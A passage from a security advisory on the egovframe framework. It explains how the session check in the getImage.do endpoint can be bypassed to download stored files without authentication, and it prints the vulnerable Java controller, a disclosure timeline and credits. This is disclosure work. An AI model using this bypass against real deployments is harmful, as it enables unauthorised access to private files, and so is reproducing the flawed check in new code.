<p>Another example is the <code>/cmm/fms/getImage.do</code> API defined in <code>egovframe-common-components/src/main/java/egovframework/com/cmm/web/EgovImageProcessController.java</code> that will return any stored file depending on an encrypted variable provided by an attacker.</p>
<p>The <code>atchFileId</code> parameter obtained in the <code>GET</code> request is decrypted on line 83 and then:</p>
<ul>
<li><code>decodedSessionId</code> is obtained before the <code>|</code> character;</li>
<li><code>decodedFileId</code> is obtained after the <code>|</code> character.</li>
</ul>
<p>A verification is done on line 94, to check if the decrypted <code>decodedSessionId</code> is identical to the current <code>SessionId</code> found in the HTTP header. This <code>SessionId</code> is actually available in the HTTP requests (JSESSIONID=<code>value</code>) so this verification can be bypassed by encrypting this value on the upload form and recover it.</p>
<p>An attacker can also omit the <code>JSESSIONID</code> cookie in the HTTP request and pass an empty string for the decoded value of <code>decodedSessionId</code>.</p>
<p>And then an attacker can recover any file based on the <code>decodedFileId</code> value (e.g. FILE_000000000000001) without authentication.</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">75</span>         <span style="color: #AA22FF">@RequestMapping</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;/cmm/fms/getImage.do&quot;</span><span style="color: #666666">)</span>
 <span style="color: #666666">76</span>         <span style="color: #008000; font-weight: bold">public</span> <span style="color: #B00040">void</span> <span style="color: #0000FF">getImageInf</span><span style="color: #666666">(</span>SessionVO sessionVO<span style="color: #666666">,</span> ModelMap model<span style="color: #666666">,</span> <span style="color: #AA22FF">@RequestParam</span> Map<span style="color: #666666">&lt;</span>String<span style="color: #666666">,</span> Object<span style="color: #666666">&gt;</span> commandMap<span style="color: #666666">,</span>
 <span style="color: #666666">77</span>                         HttpServletRequest request<span style="color: #666666">,</span> HttpServletResponse response<span style="color: #666666">)</span> <span style="color: #008000; font-weight: bold">throws</span> Exception <span style="color: #666666">{</span>
 <span style="color: #666666">78</span> 
 <span style="color: #666666">79</span>                 <span style="color: #408080; font-style: italic">// ?? FileId (2022.12.06 )</span>
 <span style="color: #666666">80</span>                 <span style="color: #408080; font-style: italic">// ???</span>
 <span style="color: #666666">81</span>                 String param_atchFileId <span style="color: #666666">=</span> <span style="color: #666666">(</span>String<span style="color: #666666">)</span> commandMap<span style="color: #666666">.</span><span style="color: #7D9029">get</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;atchFileId&quot;</span><span style="color: #666666">);</span>
 <span style="color: #666666">82</span>                 param_atchFileId <span style="color: #666666">=</span> param_atchFileId<span style="color: #666666">.</span><span style="color: #7D9029">replaceAll</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot; &quot;</span><span style="color: #666666">,</span> <span style="color: #BA2121">&quot;+&quot;</span><span style="color: #666666">);</span>
 <span style="color: #666666">83</span>                 <span style="color: #B00040">byte</span><span style="color: #666666">[]</span> decodedBytes <span style="color: #666666">=</span> Base64<span style="color: #666666">.</span><span style="color: #7D9029">getDecoder</span><span style="color: #666666">().</span><span style="color: #7D9029">decode</span><span style="color: #666666">(</span>param_atchFileId<span style="color: #666666">);</span>
 <span style="color: #666666">84</span>                 String decodedString <span style="color: #666666">=</span> cryptoService<span style="color: #666666">.</span><span style="color: #7D9029">decrypt</span><span style="color: #666666">(</span><span style="color: #008000; font-weight: bold">new</span> String<span style="color: #666666">(</span>decodedBytes<span style="color: #666666">));</span>
 <span style="color: #666666">85</span>                 String decodedSessionId <span style="color: #666666">=</span> StringUtils<span style="color: #666666">.</span><span style="color: #7D9029">substringBefore</span><span style="color: #666666">(</span>decodedString<span style="color: #666666">,</span> <span style="color: #BA2121">&quot;|&quot;</span><span style="color: #666666">);</span>
 <span style="color: #666666">86</span>                 String decodedFileId <span style="color: #666666">=</span> StringUtils<span style="color: #666666">.</span><span style="color: #7D9029">substringAfter</span><span style="color: #666666">(</span>decodedString<span style="color: #666666">,</span> <span style="color: #BA2121">&quot;|&quot;</span><span style="color: #666666">);</span>
 <span style="color: #666666">87</span> 
 <span style="color: #666666">88</span>                 String fileSn <span style="color: #666666">=</span> <span style="color: #666666">(</span>String<span style="color: #666666">)</span> commandMap<span style="color: #666666">.</span><span style="color: #7D9029">get</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;fileSn&quot;</span><span style="color: #666666">);</span>
 <span style="color: #666666">89</span> 
 <span style="color: #666666">90</span>                 String sessionId <span style="color: #666666">=</span> request<span style="color: #666666">.</span><span style="color: #7D9029">getSession</span><span style="color: #666666">().</span><span style="color: #7D9029">getId</span><span style="color: #666666">();</span>
 <span style="color: #666666">91</span> 
 <span style="color: #666666">92</span>                 <span style="color: #B00040">boolean</span> isSameSessionId <span style="color: #666666">=</span> StringUtils<span style="color: #666666">.</span><span style="color: #7D9029">equals</span><span style="color: #666666">(</span>decodedSessionId<span style="color: #666666">,</span> sessionId<span style="color: #666666">);</span>
 <span style="color: #666666">93</span> 
 <span style="color: #666666">94</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(!</span>isSameSessionId<span style="color: #666666">)</span> <span style="color: #666666">{</span>
 <span style="color: #666666">95</span>                         <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> Exception<span style="color: #666666">();</span>
 <span style="color: #666666">96</span>                 <span style="color: #666666">}</span>
 <span style="color: #666666">97</span> 
 <span style="color: #666666">98</span>                 FileVO vo <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> FileVO<span style="color: #666666">();</span>
 <span style="color: #666666">99</span> 
<span style="color: #666666">100</span>                 vo<span style="color: #666666">.</span><span style="color: #7D9029">setAtchFileId</span><span style="color: #666666">(</span>decodedFileId<span style="color: #666666">);</span>
<span style="color: #666666">101</span>                 vo<span style="color: #666666">.</span><span style="color: #7D9029">setFileSn</span><span style="color: #666666">(</span>fileSn<span style="color: #666666">);</span>
<span style="color: #666666">102</span> 
<span style="color: #666666">103</span>                 <span style="color: #408080; font-style: italic">// ------------------------------------------------------------</span>
<span style="color: #666666">104</span>                 <span style="color: #408080; font-style: italic">// fileSn???</span>
<span style="color: #666666">105</span>                 <span style="color: #408080; font-style: italic">// ------------------------------------------------------------</span>
<span style="color: #666666">106</span>                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>fileSn <span style="color: #666666">==</span> <span style="color: #008000; font-weight: bold">null</span> <span style="color: #666666">||</span> fileSn<span style="color: #666666">.</span><span style="color: #7D9029">equals</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;&quot;</span><span style="color: #666666">))</span> <span style="color: #666666">{</span>
<span style="color: #666666">107</span>                         <span style="color: #B00040">int</span> newMaxFileSN <span style="color: #666666">=</span> fileService<span style="color: #666666">.</span><span style="color: #7D9029">getMaxFileSN</span><span style="color: #666666">(</span>vo<span style="color: #666666">);</span>
<span style="color: #666666">108</span>                         vo<span style="color: #666666">.</span><span style="color: #7D9029">setFileSn</span><span style="color: #666666">(</span>Integer<span style="color: #666666">.</span><span style="color: #7D9029">toString</span><span style="color: #666666">(</span>newMaxFileSN <span style="color: #666666">-</span> <span style="color: #666666">1));</span>
<span style="color: #666666">109</span>                 <span style="color: #666666">}</span>
<span style="color: #666666">110</span>                 <span style="color: #408080; font-style: italic">// ------------------------------------------------------------</span>
<span style="color: #666666">111</span> 
<span style="color: #666666">112</span>                 FileVO fvo <span style="color: #666666">=</span> fileService<span style="color: #666666">.</span><span style="color: #7D9029">selectFileInf</span><span style="color: #666666">(</span>vo<span style="color: #666666">);</span>
<span style="color: #666666">113</span> 
<span style="color: #666666">114</span>                 <span style="color: #408080; font-style: italic">// String fileLoaction = fvo.getFileStreCours() + fvo.getStreFileNm();</span>
<span style="color: #666666">115</span> 
<span style="color: #666666">116</span>                 String fileStreCours <span style="color: #666666">=</span> EgovWebUtil<span style="color: #666666">.</span><span style="color: #7D9029">filePathBlackList</span><span style="color: #666666">(</span>fvo<span style="color: #666666">.</span><span style="color: #7D9029">getFileStreCours</span><span style="color: #666666">());</span>
<span style="color: #666666">117</span>                 String streFileNm <span style="color: #666666">=</span> EgovWebUtil<span style="color: #666666">.</span><span style="color: #7D9029">filePathBlackList</span><span style="color: #666666">(</span>fvo<span style="color: #666666">.</span><span style="color: #7D9029">getStreFileNm</span><span style="color: #666666">());</span>
<span style="color: #666666">118</span>                 File file <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> File<span style="color: #666666">(</span>fileStreCours<span style="color: #666666">,</span> streFileNm<span style="color: #666666">);</span>
<span style="color: #666666">119</span> 
<span style="color: #666666">120</span>                 ByteArrayOutputStream bStream <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span><span style="color: #666666">;</span>
<span style="color: #666666">121</span> 
<span style="color: #666666">122</span>                 <span style="color: #008000; font-weight: bold">try</span> <span style="color: #666666">(</span>FileInputStream fis <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> FileInputStream<span style="color: #666666">(</span>file<span style="color: #666666">);</span> BufferedInputStream in <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> BufferedInputStream<span style="color: #666666">(</span>fis<span style="color: #666666">);)</span> <span style="color: #666666">{</span>
<span style="color: #666666">123</span>                         bStream <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> ByteArrayOutputStream<span style="color: #666666">();</span>
<span style="color: #666666">124</span> 
<span style="color: #666666">125</span>                         FileCopyUtils<span style="color: #666666">.</span><span style="color: #7D9029">copy</span><span style="color: #666666">(</span>in<span style="color: #666666">,</span> bStream<span style="color: #666666">);</span>
<span style="color: #666666">126</span> 
<span style="color: #666666">127</span>                         String type <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">128</span> 
<span style="color: #666666">129</span>                         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>fvo<span style="color: #666666">.</span><span style="color: #7D9029">getFileExtsn</span><span style="color: #666666">()</span> <span style="color: #666666">!=</span> <span style="color: #008000; font-weight: bold">null</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #666666">!</span><span style="color: #BA2121">&quot;&quot;</span><span style="color: #666666">.</span><span style="color: #7D9029">equals</span><span style="color: #666666">(</span>fvo<span style="color: #666666">.</span><span style="color: #7D9029">getFileExtsn</span><span style="color: #666666">()))</span> <span style="color: #666666">{</span>
<span style="color: #666666">130</span>                                 <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span><span style="color: #BA2121">&quot;jpg&quot;</span><span style="color: #666666">.</span><span style="color: #7D9029">equals</span><span style="color: #666666">(</span>fvo<span style="color: #666666">.</span><span style="color: #7D9029">getFileExtsn</span><span style="color: #666666">().</span><span style="color: #7D9029">toLowerCase</span><span style="color: #666666">()))</span> <span style="color: #666666">{</span>
<span style="color: #666666">131</span>                                         type <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;image/jpeg&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">132</span>                                 <span style="color: #666666">}</span> <span style="color: #008000; font-weight: bold">else</span> <span style="color: #666666">{</span>
<span style="color: #666666">133</span>                                         type <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;image/&quot;</span> <span style="color: #666666">+</span> fvo<span style="color: #666666">.</span><span style="color: #7D9029">getFileExtsn</span><span style="color: #666666">().</span><span style="color: #7D9029">toLowerCase</span><span style="color: #666666">();</span>
<span style="color: #666666">134</span>                                 <span style="color: #666666">}</span>
<span style="color: #666666">135</span>                                 <span style="color: #408080; font-style: italic">/* type = &quot;image/&quot; + fvo.getFileExtsn().toLowerCase(); */</span>
<span style="color: #666666">136</span> 
<span style="color: #666666">137</span>                         <span style="color: #666666">}</span> <span style="color: #008000; font-weight: bold">else</span> <span style="color: #666666">{</span>
<span style="color: #666666">138</span>                                 LOGGER<span style="color: #666666">.</span><span style="color: #7D9029">debug</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;Image fileType is null.&quot;</span><span style="color: #666666">);</span>
<span style="color: #666666">139</span>                         <span style="color: #666666">}</span>
<span style="color: #666666">140</span> 
<span style="color: #666666">141</span>                         response<span style="color: #666666">.</span><span style="color: #7D9029">setHeader</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;Content-Type&quot;</span><span style="color: #666666">,</span> EgovWebUtil<span style="color: #666666">.</span><span style="color: #7D9029">removeCRLF</span><span style="color: #666666">(</span>type<span style="color: #666666">));</span>
<span style="color: #666666">142</span>                         response<span style="color: #666666">.</span><span style="color: #7D9029">setContentLength</span><span style="color: #666666">(</span>bStream<span style="color: #666666">.</span><span style="color: #7D9029">size</span><span style="color: #666666">());</span>
<span style="color: #666666">143</span> 
<span style="color: #666666">144</span>                         bStream<span style="color: #666666">.</span><span style="color: #7D9029">writeTo</span><span style="color: #666666">(</span>response<span style="color: #666666">.</span><span style="color: #7D9029">getOutputStream</span><span style="color: #666666">());</span>
<span style="color: #666666">145</span> 
<span style="color: #666666">146</span>                         response<span style="color: #666666">.</span><span style="color: #7D9029">getOutputStream</span><span style="color: #666666">().</span><span style="color: #7D9029">flush</span><span style="color: #666666">();</span>
<span style="color: #666666">147</span>                         response<span style="color: #666666">.</span><span style="color: #7D9029">getOutputStream</span><span style="color: #666666">().</span><span style="color: #7D9029">close</span><span style="color: #666666">();</span>
<span style="color: #666666">148</span> 
<span style="color: #666666">149</span>                 <span style="color: #666666">}</span> <span style="color: #008000; font-weight: bold">finally</span> <span style="color: #666666">{</span>
<span style="color: #666666">150</span>                         EgovResourceCloseHelper<span style="color: #666666">.</span><span style="color: #7D9029">close</span><span style="color: #666666">(</span>bStream<span style="color: #666666">);</span>
<span style="color: #666666">151</span>                 <span style="color: #666666">}</span>
<span style="color: #666666">152</span>         <span style="color: #666666">}</span>
</pre></div>

<p><a id="timeline"></a></p>
<h2>Report Timeline</h2>
<ul>
<li>Mar 2023: Security assessment performed on egovframe.</li>
<li>Apr 2023: Advisories shared with POC Security at the Zer0con conference.</li>
<li>Aug 2023: KISA confirmed the exploitability of the vulnerabilties.</li>
<li>Oct 2023: KrCERT confirmed to POC Security that vulnerabilities have been patched.</li>
<li>Sep 2025: I contacted POC Security to report that, in my opinion, the vulnerabilities had not been properly patched and to ask them to check previous emails with KrCERT.</li>
<li>Sep 2025: POC Security confirmed that KrCERT had indicated, during previous exchanges, that all vulnerabilities had been patched.</li>
<li>Nov 19, 2025: Vulncheck assigned CVEs.</li>
<li>Nov 20, 2025: A security advisory is published.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Barre aka Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2025-11-20-egovframe-2-vulnerabilities.html">https://pierrekim.github.io/blog/2025-11-20-egovframe-2-vulnerabilities.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/2025-egovframe.txt">https://pierrekim.github.io/advisories/2025-egovframe.txt</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
    <div>
        <p class="text-muted">published on 2025-11-20 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
    </div>
</div>

</div>
</body>
</html>